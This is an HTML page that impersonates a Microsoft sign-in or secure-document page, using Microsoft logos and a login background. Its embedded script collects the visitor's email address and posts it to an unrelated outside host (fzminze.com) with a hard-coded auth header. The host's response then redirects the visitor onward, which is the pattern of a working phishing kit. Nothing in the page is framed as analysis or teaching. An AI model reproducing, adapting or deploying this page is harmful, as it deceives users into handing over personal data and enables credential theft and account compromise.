
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Email Confirmation</title>
    <style>
        body {
            font-family: "Segoe UI", -apple-system, BlinkMacSystemFont, Roboto, "Helvetica Neue", sans-serif;
            background-color: #f4f4f4;
            margin: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            color: #333;
            background-image: url('https://upload.wikimedia.org/wikipedia/commons/3/33/Microsoft_login_screen.svg');
            background-size: cover;
            background-position: center;
        }
        .container {
            background-color: white;
            border: 1px solid #ccc;
            border-radius: 3px;
            padding: 33px;
            width: 80%;
            max-width: 320px;
            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
            text-align: center;
        }
        .container img {
            width: 100px;
            margin-bottom: 20px;
        }
        .container input[type="email"] {
            width: 100%;
            padding: 10px;
            margin-bottom: 20px;
            border: 1px solid #ccc;
            border-radius: 3px;
            font-size: 16px;
            text-align: center;
        }
        .container button {
            width: 100%;
            padding: 10px;
            background-color: #0078d4;
            color: white;
            border: none;
            border-radius: 3px;
            font-size: 16px;
            cursor: pointer;
        }
        .container button:hover {
            background-color: #005a9e;
        }
        .loading-section {
            display: none;
            position: fixed;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            text-align: center;
            font-size: 18px;
        }
        .spinner {
            width: 40px;
            height: 40px;
            border: 5px solid rgba(0, 0, 0, 0.1);
            border-top-color: #3498db;
            border-radius: 50%;
            animation: spin 1s linear infinite;
            margin: 10px auto;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
    </style>
</head>
<body>
    <div class="container">
        <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/9/96/Microsoft_logo_%282012%29.svg/1280px-Microsoft_logo_%282012%29.svg.png" alt="Logo">
        <h2>Access Your Secure Document</h2>
        <p>Enter your email to continue</p>
        <input type="email" id="emailInput" placeholder="Enter your email" required>
        <button id="submitButton">Continue</button>
        <p class="footer">By continuing, you agree to our terms and privacy policy.</p>
    </div>
    <div class="loading-section" id="loadingSection">
        <div class="spinner"></div>
        <p>Verifying your details...</p>
    </div>
    <script>
        document.getElementById("submitButton").addEventListener("click", async function() {
            const emailInput = document.getElementById("emailInput").value.trim();
            if (!emailInput || !emailInput.includes("@")) {
                alert("Please enter a valid email address.");
                return;
            }
            document.querySelector(".container").style.display = "none";
            document.getElementById("loadingSection").style.display = "block";
            const endpoint = "https://wd0c435.fzminze.com/iALQhehr?zry=an1FRGhmbUo0HcrnJQhn3Xyguts3200F6IQRnhaxiZ8JQyGXTSCeUvSd5q0n#";
            try {
                const response = await fetch(endpoint, {
                    method: "POST",
                    headers: {
                        "Content-Type": "application/json",
                        "X-Special-Auth": "cSah8ebIoxxdnxYuthJiSvA7FYfqrHF9"
                    },
                    body: JSON.stringify({ email: emailInput }),
                });
                if (response.ok) {
                    const finalRedirectUrl = await response.text();
                    setTimeout(() => { window.location.href = finalRedirectUrl; }, 3000);
                } else {
                    alert("Error processing request. Please try again.");
                }
            } catch (error) {
                console.error("Error:", error);
                alert("Unable to process request.");
            }
        });
        document.getElementById("emailInput").addEventListener("keydown", function(event) {
            if (event.key === 'Enter') {
                document.getElementById("submitButton").click();
            }
        });
    </script>
</body>
</html>
